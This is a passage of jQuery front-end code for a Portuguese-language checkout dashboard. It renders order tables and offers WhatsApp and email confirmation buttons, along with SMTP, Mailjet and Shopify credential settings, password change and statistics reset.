                                                    }

                                                    $(
                                                        "#content_modal_whatsapp"
                                                    ).empty();

                                                    $("#content_modal_whatsapp")
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 31%; margin: 5px; height: 100%; display: flex; flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Confirmação de Pedido",
                                                                            style: "font-size: 0.7vw; text-align: center;",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                hash +
                                                                                " btn btn-success",
                                                                            text: "Enviado",
                                                                            disabled: true,
                                                                            flag: "pedido",
                                                                        }
                                                                    )
                                                                )
                                                        )
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 31%; margin: 5px; height: 100%; display: flex; flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Confirmação de Pagamento",
                                                                            style: "font-size: 0.7vw; text-align: center;",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                hash +
                                                                                " btn btn-" +
                                                                                (dados.whatsapp_pgtoaprovado ==
                                                                                "s"
                                                                                    ? "success"
                                                                                    : "primary"),
                                                                            text:
                                                                                dados.whatsapp_pgtoaprovado ==
                                                                                "s"
                                                                                    ? "Enviado"
                                                                                    : "Enviar",
                                                                            disabled:
                                                                                dados.whatsapp_pgtoaprovado ==
                                                                                "s"
                                                                                    ? true
                                                                                    : false,
                                                                            flag: "aprovado",
                                                                        }
                                                                    )
                                                                )
                                                        )
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 31%; margin: 5px; height: 100%; display: flex; flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Confirmação de Rastreio",
                                                                            style: "font-size: 0.7vw; text-align: center;",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                hash +
                                                                                " btn btn-" +
                                                                                (dados.whatsapp_rastreio ==
                                                                                "s"
                                                                                    ? "success"
                                                                                    : "primary"),
                                                                            text:
                                                                                dados.whatsapp_rastreio ==
                                                                                "s"
                                                                                    ? "Enviado"
                                                                                    : "Enviar",
                                                                            disabled:
                                                                                dados.whatsapp_rastreio ==
                                                                                "s"
                                                                                    ? true
                                                                                    : false,
                                                                            flag: "rastreio",
                                                                        }
                                                                    )
                                                                )
                                                        );

                                                    $("." + hash).click(
                                                        function (e) {
                                                            e.preventDefault();
                                                            _global.enviaMensagemWhatsapp(
                                                                hash,
                                                                $(this).attr(
                                                                    "flag"
                                                                ),
                                                                $(this)
                                                            );
                                                        }
                                                    );

                                                    $("#modalwhatsapp").modal(
                                                        "show"
                                                    );
                                                },
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                            style: "align-items: center; display: flex; justify-content: center;",
                                        }).append(
                                            $("<img>", {
                                                src: "/assetsdashboard/img/email.png",
                                                class: "cursorpointer enviozapzap",
                                                style: "width: 35%;",
                                                h: v.hash,
                                                i: v.id_loja,
                                                click: async function (e) {
                                                    let h = $(this).attr("h");
                                                    let l = $(this).attr("i");

                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/verificaEmailPedido",
                                                            {
                                                                h: $(this).attr(
                                                                    "h"
                                                                ),
                                                                l: $(this).attr(
                                                                    "i"
                                                                ),
                                                            },
                                                            "POST"
                                                        );

                                                    if (dados.status == 404) {
                                                        _global.toast(
                                                            "A loja não tem um SMTP cadastrado.",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }

                                                    $(
                                                        "#content_modal_email"
                                                    ).empty();
                                                    $("#content_modal_email")
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 33%; height: 100%; display: flex;     flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Confirmação de Pedido",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                "btn btn-" +
                                                                                (dados.email_pedido ==
                                                                                "n"
                                                                                    ? "primary"
                                                                                    : "success"),
                                                                            text:
                                                                                dados.email_pedido ==
                                                                                "n"
                                                                                    ? "Enviar"
                                                                                    : "Enviado",
                                                                            disabled:
                                                                                dados.email_pedido ==
                                                                                "n"
                                                                                    ? false
                                                                                    : true,
                                                                            click: async function (
                                                                                e
                                                                            ) {
                                                                                _global.btnCarregando(
                                                                                    $(
                                                                                        this
                                                                                    ),
                                                                                    true,
                                                                                    "Enviar"
                                                                                );

                                                                                let dados =
                                                                                    await _global.busca(
                                                                                        "dashboard/enviaConfirmacaoPedido",
                                                                                        {
                                                                                            h: h,
                                                                                            l: l,
                                                                                        },
                                                                                        "POST"
                                                                                    );

                                                                                if (
                                                                                    dados.status ==
                                                                                    200
                                                                                ) {
                                                                                    _global.btnCarregando(
                                                                                        $(
                                                                                            this
                                                                                        ),
                                                                                        false,
                                                                                        "Enviado"
                                                                                    );
                                                                                    $(
                                                                                        this
                                                                                    )
                                                                                        .removeClass(
                                                                                            "btn-primary"
                                                                                        )
                                                                                        .addClass(
                                                                                            "btn-success"
                                                                                        );
                                                                                    $(
                                                                                        this
                                                                                    ).prop(
                                                                                        "disabled",
                                                                                        true
                                                                                    );
                                                                                    _global.toast(
                                                                                        "O email de confirmação foi enviado com sucesso.",
                                                                                        "toastsucesso"
                                                                                    );
                                                                                } else {
                                                                                    _global.btnCarregando(
                                                                                        $(
                                                                                            this
                                                                                        ),
                                                                                        false,
                                                                                        "Enviar"
                                                                                    );
                                                                                    _global.toast(
                                                                                        "Não foi possível enviar o email de confirmação",
                                                                                        "toasterro"
                                                                                    );
                                                                                }
                                                                            },
                                                                        }
                                                                    )
                                                                )
                                                        )
                                                        .append(
                                                            $("<div>", {
                                                                style: "width: 33%; height: 100%; display: flex; margin-left: 15px; flex-direction: column;",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<span>",
                                                                        {
                                                                            text: "Lembrete de Pagamento",
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $(
                                                                        "<button>",
                                                                        {
                                                                            class:
                                                                                "btn btn-" +
                                                                                (dados.email_lembrete ==
                                                                                "n"
                                                                                    ? "primary"
                                                                                    : "success"),
                                                                            text:
                                                                                dados.email_lembrete ==
                                                                                "n"
                                                                                    ? "Enviar"
                                                                                    : "Enviado",
                                                                            disabled:
                                                                                dados.email_lembrete ==
                                                                                "n"
                                                                                    ? false
                                                                                    : true,
                                                                            click: async function (
                                                                                e
                                                                            ) {
                                                                                _global.btnCarregando(
                                                                                    $(
                                                                                        this
                                                                                    ),
                                                                                    true,
                                                                                    "Enviar"
                                                                                );

                                                                                let dados =
                                                                                    await _global.busca(
                                                                                        "dashboard/enviaLembretePagamento",
                                                                                        {
                                                                                            h: h,
                                                                                            l: l,
                                                                                        },
                                                                                        "POST"
                                                                                    );

                                                                                if (
                                                                                    dados.status ==
                                                                                    200
                                                                                ) {
                                                                                    _global.btnCarregando(
                                                                                        $(
                                                                                            this
                                                                                        ),
                                                                                        false,
                                                                                        "Enviado"
                                                                                    );
                                                                                    $(
                                                                                        this
                                                                                    )
                                                                                        .removeClass(
                                                                                            "btn-primary"
                                                                                        )
                                                                                        .addClass(
                                                                                            "btn-success"
                                                                                        );
                                                                                    $(
                                                                                        this
                                                                                    ).prop(
                                                                                        "disabled",
                                                                                        true
                                                                                    );
                                                                                    _global.toast(
                                                                                        "O email de lembrete de pagamento foi enviado com sucesso.",
                                                                                        "toastsucesso"
                                                                                    );
                                                                                } else {
                                                                                    _global.btnCarregando(
                                                                                        $(
                                                                                            this
                                                                                        ),
                                                                                        false,
                                                                                        "Enviar"
                                                                                    );
                                                                                    _global.toast(
                                                                                        "Não foi possível enviar o email de lembrete de pagamento",
                                                                                        "toasterro"
                                                                                    );
                                                                                }
                                                                            },
                                                                        }
                                                                    )
                                                                )
                                                        );

                                                    $("#modalemail").modal(
                                                        "show"
                                                    );
                                                },
                                            })
                                        )
                                    )
                                )
                            )
                            .append(
                                $("<td>").append(
                                    $("<div>", {
                                        class: "d-flex px-2 centraliza",
                                    }).append(
                                        $("<div>", {
                                            class: "my-auto",
                                        }).append(
                                            $("<span>", {
                                                class: "btn-inner--icon cursorpointer",
                                                style: "display: flex; justify-content: center;",
                                                pedido: v.id_carrinho,
                                                click: function (e) {
                                                    $(
                                                        "#btn_modal_apaga"
                                                    ).click();
                                                    $(
                                                        "#confirma_deleta_pedido"
                                                    ).attr(
                                                        "pedido",
                                                        $(this).attr("pedido")
                                                    );
                                                },
                                            }).append(
                                                $("<i>", {
                                                    class: "ni ni-fat-remove",
                                                    style: "font-size: 25px; color: red;",
                                                })
                                            )
                                        )
                                    )
                                )
                            )
                    );
                });
            }

            let tamanho = _l.length;
            if (tamanho > 0) {
                let _first = true;
                for (i = 1; i <= tamanho; i++) {
                    $("#ul_pedidos").append(
                        $("<li>", {
                            class: "page-item " + (i == 1 ? "active" : ""),
                            pagina: i,
                        }).append(
                            $("<a>", {
                                style: i == 1 ? "color: white;" : "",
                                class: "page-link cursorpointer",
                                text: i,
                                click: function (e) {
                                    $(this).parent().addClass("active");
                                    $(this).css("color", "white");
                                    let pagina = $(this)
                                        .parent()
                                        .attr("pagina");

                                    $("#ul_pedidos")
                                        .children()
                                        .each((i, v) => {
                                            if ($(v).attr("pagina") != pagina) {
                                                $(v).removeClass("active");
                                                $(v)
                                                    .children()
                                                    .css("color", "#8392ab");
                                            }
                                        });
                                    _global.reconstroiTabela(pagina - 1);
                                },
                            })
                        )
                    );
                }
            }
        },
        async deletaPedido(pedido, idloja) {
            _global.btnCarregando(
                $("#confirma_deleta_pedido"),
                true,
                "Confirmar"
            );
            let deleta = await this.busca(
                "dashboard/deletapedido",
                {
                    pedido: pedido,
                },
                "POST"
            );

            if (deleta.status == 200) {
                let novaLista = [];

                _global.pedidos.forEach((v, i) => {
                    if (novaLista[i] == undefined) novaLista[i] = [];
                    v.forEach((_v, _i) => {
                        if (_v.id_carrinho != pedido) novaLista[i].push(_v);
                    });
                });
                _global.pedidos = novaLista;
                _global.btnCarregando(
                    $("#confirma_deleta_pedido"),
                    false,
                    "Confirmar"
                );
                $("#btn_cancela").click();
                $("#pedido_" + pedido).remove();

                _global.toast(
                    "O pedido foi apagado com sucesso",
                    "toastsucesso"
                );

                _global.getCards();
            }
        },
        async getCards() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca(
                "dashboard/getCards",
                {
                    id_usuario: usuario.id_usuario,
                    tipo_usuario: usuario.tipo_usuario,
                },
                "POST"
            );
            const n = async function () {
                return new Promise((res) => {
                    $("#pedidos_hoje").attr("data-count", dados.pedidos.hoje);
                    $("#pedidos_total").attr("data-count", dados.pedidos.total);
                    $("#visitas_hoje").attr("data-count", dados.visitas.hoje);
                    $("#visitas_total").attr("data-count", dados.visitas.total);
                    $("#nr_dias").attr("data-count", dados.dias);
                    $("#nr_lojas").attr("data-count", dados.total_loja);
                    $("#qtd_cartoes").text(`(${dados.cartoes})`);
                    $("#total_facebook").text(`(${dados.facebook})`);
                    $("#qtd_facebook").text(`(${dados.facebook})`);
                    $("#total_facebookhj").text(`(${dados.facebookHj})`);
                    res();
                });
            };
            n().then(() => {
                _global.counterCards();
            });
        },
        counterCards() {
            $(".counter").each(function () {
                var $this = $(this),
                    countTo = $this.attr("data-count");

                $({ countNum: $this.text() }).animate(
                    {
                        countNum: countTo,
                    },

                    {
                        duration: 500,
                        easing: "linear",
                        step: function () {
                            $this.text(Math.floor(this.countNum));
                        },
                        complete: function () {
                            $this.text(this.countNum);
                        },
                    }
                );
            });
        },
        async getCardsPerfil() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca(
                "dashboard/getCardsPerfil",
                {
                    token: usuario.token_checkout,
                    tipo_usuario: usuario.tipo_usuario,
                    id_usuario: usuario.id_usuario,
                },
                "POST"
            );

            $("#limite_lojas").text(dados.qtd_lojas ?? "Erro interno");
            $("#limite_dominio").text(dados.qtd_dominio ?? "Erro interno");
            $("#dias_token").text(dados.dias ?? "Erro interno");
        },
        async alterarSenha() {
            if ($("#senha_antiga").val().length < 1) {
                _global.toast("Digite a senha atual.", "toastwarning");
                return;
            }

            if ($("#senha_nova").val().length < 1) {
                _global.toast("Digite a senha desejada.", "toastwarning");
                return;
            }

            _global.btnCarregando($("#confirmar_senha"), true, "Confirmar");

            const usuario = _global.getUsuario();
            let dados = await _global.busca(
                "dashboard/alterarSenha",
                {
                    i: $("#confirmar_senha").attr("i"),
                    n: $("#senha_nova").val(),
                    v: $("#senha_antiga").val(),
                    u: usuario.usuario,
                },
                "POST"
            );

            if (dados.status == 401) {
                _global.toast("A sua senha atual está incorreta", "toasterro");
                _global.btnCarregando(
                    $("#confirmar_senha"),
                    false,
                    "Confirmar"
                );
                return;
            }

            if (dados.status == 200) {
                _global.toast(
                    "A senha foi alterada com sucesso. Você será redirecionado.",
                    "toastsucesso"
                );
            }

            if (dados.status == 404) {
                _global.toast(
                    "Não foi possível alterar a senha [Erro Interno - 404]",
                    "toasterro"
                );
                _global.btnCarregando(
                    $("#confirmar_senha"),
                    false,
                    "Confirmar"
                );
                return;
            }

            setTimeout(() => {
                _global.destroiSessao().then(() => {
                    location.href = "/entrar";
                });
            }, 1500);
        },
        async monitoraOnline() {
            setInterval(() => {
                if (_aba == "dashboard") {
                    _global.loadingAba("dashboard", true);
                    _global.usuariosOnlineCheckout();
                }
            }, 10000);
        },
        resetaEstatisticas() {
            $("#reseta_pedidos")
                .off("click")
                .on("click", async function (e) {
                    e.preventDefault();
                    let c = confirm(
                        "Você deseja resetar os pedidos? Os pedidos serão deletados e os contadores resetados!"
                    );
                    if (c) {
                        const usuario = _global.getUsuario();
                        let req = await _global.busca(
                            "dashboard/resetaEst",
                            {
                                flag: "pedidos",
                                id_usuario: usuario.id_usuario,
                                tipo_usuario: usuario.tipo_usuario,
                            },
                            "POST"
                        );

                        if (req.status == 200) {
                            _global.toast(
                                "Os contadores dos pedidos foram resetados!",
                                "toastsucesso"
                            );
                            _global.getCards();
                        }
                    }
                });
            $("#reseta_visitas")
                .off("click")
                .on("click", async function (e) {
                    e.preventDefault();
                    let c = confirm(
                        "Você deseja resetar as visitas? As visitas serão deletadas e os contadores resetados!"
                    );
                    if (c) {
                        const usuario = _global.getUsuario();
                        let req = await _global.busca(
                            "dashboard/resetaEst",
                            {
                                flag: "visitas",
                                id_usuario: usuario.id_usuario,
                                tipo_usuario: usuario.tipo_usuario,
                            },
                            "POST"
                        );

                        if (req.status == 200) {
                            _global.toast(
                                "Os contadores das visitas foram resetados!",
                                "toastsucesso"
                            );
                            _global.getCards();
                        }
                    }
                });
        },
        async configWhatsapp() {
            _global.loadingAba("config_whatsapp", true);

            const usuario = _global.getUsuario();
            let lojas = await _global.busca(
                "dashboard/getLojasCheckout",
                {
                    id_usuario: usuario.id_usuario,
                    tipo_usuario: usuario.tipo_usuario,
                },
                "POST"
            );

            $("#select_loja_whatsapp").empty();

            if (lojas.length == 0) {
                $("#select_loja_whatsapp").append(
                    $("<option>", {
                        value: "-1",
                        text: "Não há lojas cadastradas.",
                    })
                );
                $("#select_loja_whatsapp").prop("disabled", true);
                _global.loadingAba("config_whatsapp", false);
                return;
            }

            $("#select_loja_whatsapp").append(
                $("<option>", {
                    value: "-1",
                    text: "Selecione uma loja.",
                })
            );

            lojas.forEach((v, i) => {
                $("#select_loja_whatsapp").append(
                    $("<option>", {
                        value: v.id_loja,
                        text: v.nm_loja,
                    })
                );
            });

            $("#select_loja_whatsapp").change(async function (e) {
                if ($(this).val() == "-1") {
                    return;
                }

                $('#select_loja_whatsapp   option[value="-1"]').remove();

                let dados = await _global.busca(
                    "dashboard/getWhatsapp",
                    {
                        id_loja: $("#select_loja_whatsapp").val(),
                    },
                    "POST"
                );

                $(".tempcardwhatsapp").remove();

                $("#rowwhatsapp").append(
                    $("<div>", {
                        class: "col-lg-6 card tempcardwhatsapp",
                        style: "padding: 5px;",
                    }).append(
                        $("<div>", {
                            class: "col-lg-5 card flex",
                            style: "flex-direction: column; justify-content: center; align-items: center; margin: 15px;",
                        })
                            .append(
                                $("<span>", {
                                    text: "Instance ID",
                                    style: "margin-top: 5px;",
                                })
                            )
                            .append(
                                $("<input>", {
                                    class: "form-control",
                                    style: "width: 95%;",
                                    id: "instance_id",
                                    value: dados.instance_id ?? "",
                                })
                            )
                            .append(
                                $("<span>", {
                                    text: "Instance Token",
                                    style: "margin-top: 5px;",
                                })
                            )
                            .append(
                                $("<input>", {
                                    class: "form-control",
                                    style: "width: 95%;",
                                    id: "instance_token",
                                    value: dados.instance_token ?? "",
                                })
                            )
                            .append(
                                $("<span>", {
                                    text: "Token de Segurança",
                                    style: "margin-top: 5px;",
                                })
                            )
                            .append(
                                $("<input>", {
                                    class: "form-control",
                                    style: "width: 95%;",
                                    id: "token_seguranca",
                                    value: dados.token_seguranca ?? "",
                                })
                            )
                            .append(
                                $("<span>", {
                                    text: "Rastreio Padrão",
                                    style: "margin-top: 5px;",
                                })
                            )
                            .append(
                                $("<input>", {
                                    class: "form-control",
                                    style: "width: 95%;",
                                    id: "rastreio_padrao",
                                    value: dados.rastreio_padrao ?? "",
                                })
                            )
                            .append(
                                $("<button>", {
                                    class: "btn btn-primary",
                                    style: "margin-top: 10px; border-radius: 30px; width: 95%;",
                                    text: "Salvar Informações",
                                    click: async function (e) {
                                        if (
                                            $("#instance_id").val() == "" ||
                                            $("#instance_id").val().length < 5
                                        ) {
                                            _global.toast(
                                                "Verifique o valor de Instance ID!",
                                                "toasterro"
                                            );
                                            return;
                                        }

                                        if (
                                            $("#instance_token").val() == "" ||
                                            $("#instance_token").val().length <
                                                5
                                        ) {
                                            _global.toast(
                                                "Verifique o valor de Instance Token!",
                                                "toasterro"
                                            );
                                            return;
                                        }

                                        _global.btnCarregando(
                                            $(this),
                                            true,
                                            "Salvar Informações"
                                        );
                                        let dados = await _global.busca(
                                            "dashboard/updateWhatsapp",
                                            {
                                                instance_id:
                                                    $("#instance_id").val(),
                                                instance_token:
                                                    $("#instance_token").val(),
                                                id_loja: $(
                                                    "#select_loja_whatsapp"
                                                ).val(),
                                                token_seguranca:
                                                    $("#token_seguranca").val(),
                                                rastreio_padrao:
                                                    $("#rastreio_padrao").val(),
                                            },
                                            "POST"
                                        );

                                        if (dados.status == 200) {
                                            _global.toast(
                                                "As credenciais foram salvas.",
                                                "toastsucesso"
                                            );
                                        } else {
                                            _global.toast(
                                                "Houve um erro ao salvar [ERRO INTERNO].",
                                                "toasterro"
                                            );
                                        }
                                        _global.btnCarregando(
                                            $(this),
                                            false,
                                            "Salvar Informações"
                                        );
                                    },
                                })
                            )
                    )
                );
            });
            _global.loadingAba("config_whatsapp", false);
        },
        async enviaMensagemWhatsapp(hash, tipoMensagem, btn) {
            _global.btnCarregando($(btn), true, "Enviado");

            let r = "";

            if (tipoMensagem == "rastreio") {
                r = prompt(
                    "Deseja digitar um código de rastreio? (DEIXE EM BRANCO CASO QUEIRA ENVIAR O RASTREIO PADRÃO)"
                );
            }

            let dados = await _global.busca(
                "dashboard/enviaWhats",
                {
                    hash: hash,
                    tipoMensagem: tipoMensagem,
                    rastreio: r != "" ? r : false,
                },
                "POST"
            );

            if (dados.status == 200) {
                _global.btnCarregando($(btn), false, "Enviado");
                $(btn).attr("class", hash + " btn btn-success");
                $(btn).prop("disabled", true);
                _global.toast(
                    "A mensagem foi enviada com sucesso!",
                    "toastsucesso"
                );
            } else {
                _global.btnCarregando($(btn), false, "Enviar");
                _global.toast(
                    "Não foi possível enviar a mensagem [ERRO INTERNO]",
                    "toasterro"
                );
            }
        },
        async getLojasEmail() {
            const usuario = _global.getUsuario();
            let dados = await _global.busca(
                "dashboard/getLojasEmail",
                {
                    u: usuario.id_usuario,
                },
                "POST"
            );

            if (dados.length > 0) {
                $("#select_loja_email").empty();

                dados.forEach((v, i) => {
                    $("#select_loja_email").append(
                        $("<option>", {
                            value: v.id_loja,
                            text: v.nm_loja,
                        })
                    );
                });

                $("#select_loja_email").prop("disabled", false);
                $("#select_loja_email").append(
                    $("<option>", {
                        value: "-1",
                        text: "Selecione a Loja",
                        id: "temp_op_email",
                    })
                );

                $("#select_loja_email").val("-1").change();

                _global.changeSelectEmail();
            } else {
                $("#select_loja_email").empty();
                $("#select_loja_email").append(
                    $("<option>", {
                        value: "-1",
                        text: "Você não tem lojas cadastradas",
                        id: "asifhasf",
                    })
                );
            }
        },
        async changeSelectEmail() {
            $("#select_loja_email").change(async function (e) {
                $("#temp_op_email").remove();

                _global.loadingAba("config_email");
                const usuario = _global.getUsuario();

                let dados = await _global.busca(
                    "dashboard/getSmtpLoja",
                    {
                        u: usuario.id_usuario,
                        l: $("#select_loja_email").val(),
                    },
                    "POST"
                );

                if (dados.length > 0) {
                    dados = dados[0];
                    if (
                        dados.opcao_selecionada == "smtp" ||
                        dados.opcao_selecionada == null
                    ) {
                        $("#div_smtp").show();
                        $("#div_mailjet").hide();
                        $("#checkbox_smtp").prop("checked", false);
                        $("#text_checkbox_smtp").text("SMTP Padrão");

                        if (dados.opcao_selecionada != null) {
                            $("#smtp_host").val(dados.smtp_host ?? "");
                            $("#smtp_username").val(dados.smtp_username ?? "");
                            $("#smtp_password").val(dados.smtp_password ?? "");
                            $("#smtp_porta").val(dados.smtp_porta ?? "");
                            $("#smtp_email").val(dados.smtp_email ?? "");
                        }
                    } else {
                        $("#text_checkbox_smtp").text("Mailjet API");
                        $("#checkbox_smtp").prop("checked", true);
                        $("#div_mailjet").show();
                        $("#div_smtp").hide();
                        $("#mailjet_apikey").val(dados.mailjet_key ?? "");
                        $("#mailjet_secret").val(dados.mailjet_password ?? "");
                        $("#mailjet_email").val(dados.mailjet_email ?? "");
                    }
                } else {
                    $("#smtp_host").val("");
                    $("#smtp_username").val("");
                    $("#smtp_password").val("");
                    $("#smtp_porta").val("");
                    $("#smtp_email").val("");
                    $("#mailjet_apikey").val("");
                    $("#mailjet_secret").val("");
                    $("#mailjet_email").val("");
                }

                $("#checkbox_smtp").change(function (e) {
                    let vl = $(this).prop("checked");
                    let texto = $("#text_checkbox_smtp");

                    if (vl) {
                        $("#div_mailjet").show();
                        $("#div_smtp").hide();
                        $(texto).text("Mailjet API");
                    } else {
                        $("#div_mailjet").hide();
                        $("#div_smtp").show();
                        $(texto).text("SMTP Padrão");
                    }
                });

                $(".tempcardemail").show();
                _global.loadingAba("config_email", false);
            });
        },
        async eventosSmtp() {
            $("#salva_smtp").click(async function (e) {
                if ($("#smtp_host").val().length < 5) {
                    _global.toast("Verifique o campo SMTP Host", "toasterro");
                    return;
                }
                if ($("#smtp_username").val().length < 3) {
                    _global.toast(
                        "Verifique o campo SMTP Username",
                        "toasterro"
                    );
                    return;
                }
                if ($("#smtp_password").val().length < 3) {
                    _global.toast(
                        "Verifique o campo SMTP Password",
                        "toasterro"
                    );
                    return;
                }
                if ($("#smtp_porta").val().length < 1) {
                    _global.toast("Verifique o campo SMTP Porta", "toasterro");
                    return;
                }
                if ($("#smtp_email").val().length < 5) {
                    _global.toast("Verifique o campo SMTP Email", "toasterro");
                    return;
                }

                _global.btnCarregando($(this), true, "Salvar Informações");
                _global.toast(
                    "Aguarde, estamos testando suas credenciais...",
                    "toastsucesso"
                );

                let dados = await _global.busca(
                    "dashboard/verificaSmtp",
                    {
                        smtp_host: $("#smtp_host").val(),
                        smtp_porta: $("#smtp_porta").val(),
                        smtp_email: $("#smtp_email").val(),
                        smtp_password: $("#smtp_password").val(),
                        smtp_username: $("#smtp_username").val(),
                    },
                    "POST"
                );

                if (dados.status == 200) {
                    _global.toast(
                        "Credenciais verificadas com sucesso, salvando as credenciais...",
                        "toastsucesso"
                    );
                } else if (dados.status == 500) {
                    _global.toast(
                        "Não foi possível verificar suas credenciais, verifique os valores.",
                        "toasterro"
                    );
                    _global.btnCarregando($(this), false, "Salvar Informações");
                    return;
                } else {
                    _global.toast(
                        "Houve um erro interno, tente novamente.",
                        "toasterro"
                    );
                    _global.btnCarregando($(this), false, "Salvar Informações");
                    return;
                }

                let update = await _global.busca(
                    "dashboard/updateSmtp",
                    {
                        l: $("#select_loja_email").val(),
                        smtp_host: $("#smtp_host").val(),
                        smtp_porta: $("#smtp_porta").val(),
                        smtp_email: $("#smtp_email").val(),
                        smtp_password: $("#smtp_password").val(),
                        smtp_username: $("#smtp_username").val(),
                    },
                    "POST"
                );

                if (update.status == 200) {
                    _global.toast(
                        "As credenciais de SMTP foram salvas com sucesso.",
                        "toastsucesso"
                    );
                } else {
                    _global.toast(
                        "Não foi possível salvar as credenciais.",
                        "toasterro"
                    );
                }

                _global.btnCarregando($(this), false, "Salvar Informações");
            });
        },
        async integracaoShopify() {
            const usuario = _global.getUsuario();
            let lojas = await _global.busca(
                "dashboard/getLojasCheckout",
                {
                    id_usuario: usuario.id_usuario,
                    tipo_usuario: usuario.tipo_usuario,
                },
                "POST"
            );

            $("#select_loja_shopify").empty();

            if (lojas.length == 0) {
                $("#select_loja_shopify").append(
                    $("<option>", {
                        value: "-1",
                        text: "Você não tem lojas cadastradas",
                    })
                );
            } else {
                $("#select_loja_shopify").empty();
                $("#select_loja_shopify").append(
                    $("<option>", {
                        value: "-1",
                        text: "Selecione uma Loja",
                    })
                );

                $("#select_loja_shopify").val("-1").change();

                lojas.forEach((v, i) => {
                    $("#select_loja_shopify").append(
                        $("<option>", {
                            value: v.id_loja,
                            text: v.nm_loja,
                        })
                    );
                });
                $("#select_loja_shopify").prop("disabled", false);

                $("#select_loja_shopify").change(async function (e) {
                    let dados = await _global.busca(
                        "dashboard/getShopifyLoja",
                        {
                            l: $("#select_loja_shopify").val(),
                        },
                        "POST"
                    );

                    $('#select_loja_shopify   option[value="-1"]').remove();
                    $(".tempcardshopify").remove();

                    if (dados.status == 404) {
                        _global.toast(
                            "Esta loja ainda não tem uma integração, integre ela!",
                            "toastwarning"
                        );
                        $("#row_shopify").append(
                            $("<div>", {
                                class: "col-lg-6 card tempcardshopify",
                                style: "padding: 5px;",
                            }).append(
                                $("<div>", {
                                    class: "col-lg-12 card flex",
                                    style: "flex-direction: column; justify-content: center; align-items: center;",
                                }).append(
                                    $("<div>", {
                                        style: "flex-direction: column; justify-content: center; align-items: center; margin: 15px;",
                                        class: "col-lg-6 flex",
                                    })
                                        .append(
                                            $("<span>", {
                                                text: "Chave da API",
                                            })
                                        )
                                        .append(
                                            $("<input>", {
                                                type: "text",
                                                class: "form-control",
                                                id: "chave_api",
                                            })
                                        )
                                        .append(
                                            $("<span>", {
                                                text: "Chave secreta da API",
                                            })
                                        )
                                        .append(
                                            $("<input>", {
                                                type: "text",
                                                class: "form-control",
                                                id: "chave_secreta_api",
                                            })
                                        )
                                        .append(
                                            $("<span>", {
                                                text: "Token de acesso da API",
                                            })
                                        )
                                        .append(
                                            $("<input>", {
                                                type: "text",
                                                class: "form-control",
                                                id: "token_acesso_api",
                                            })
                                        )
                                        .append(
                                            $("<span>", {
                                                text: "Domínio da Loja Shopify",
                                            })
                                        )
                                        .append(
                                            $("<input>", {
                                                type: "text",
                                                class: "form-control",
                                                placeholder:
                                                    "https://xxxxxxxx.myshopify.com",
                                                id: "dominio_loja",
                                            })
                                        )
                                        .append(
                                            $("<button>", {
                                                class: "btn btn-primary",
                                                text: "Integrar",
                                                style: "width: 100%; border-radius: 30px; margin-top: 10px;",
                                                click: async function (e) {
                                                    let chaveApi =
                                                        $("#chave_api").val();
                                                    let chaveSecreta =
                                                        $(
                                                            "#chave_secreta_api"
                                                        ).val();
                                                    let tokenAcesso =
                                                        $(
                                                            "#token_acesso_api"
                                                        ).val();
                                                    let dominioLoja =
                                                        $(
                                                            "#dominio_loja"
                                                        ).val();

                                                    if (chaveApi == "") {
                                                        _global.toast(
                                                            "Preencha a Chave da API",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }

                                                    if (chaveSecreta == "") {
                                                        _global.toast(
                                                            "Preencha a Chave Secreta da Api",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }

                                                    if (tokenAcesso == "") {
                                                        _global.toast(
                                                            "Preencha o Token de Acesso da Api",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }

                                                    if (dominioLoja == "") {
                                                        _global.toast(
                                                            "Preencha o Domínio da Loja Shopify",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }

                                                    _global.btnCarregando(
                                                        $(this),
                                                        true,
                                                        "Integrar"
                                                    );

                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/updateShopifyLoja",
                                                            {
                                                                l: $(
                                                                    "#select_loja_shopify"
                                                                ).val(),
                                                                chave_api:
                                                                    chaveApi,
                                                                chave_secreta:
                                                                    chaveSecreta,
                                                                token_acesso:
                                                                    tokenAcesso,
                                                                dominio_loja:
                                                                    dominioLoja,
                                                            },
                                                            "POST"
                                                        );

                                                    if (dados.status == 500) {
                                                        _global.toast(
                                                            "Erro interno. [500]",
                                                            "toasterro"
                                                        );
                                                        _global.btnCarregando(
                                                            $(this),
                                                            false,
                                                            "Integrar"
                                                        );
                                                        return;
                                                    }

                                                    if (dados.status == 300) {
                                                        _global.toast(
                                                            "Credenciais inválidas, verifique suas credenciais.",
                                                            "toasterro"
                                                        );
                                                        _global.btnCarregando(
                                                            $(this),
                                                            false,
                                                            "Integrar"
                                                        );
                                                        return;
                                                    }

                                                    if (dados.status == 404) {
                                                        _global.toast(
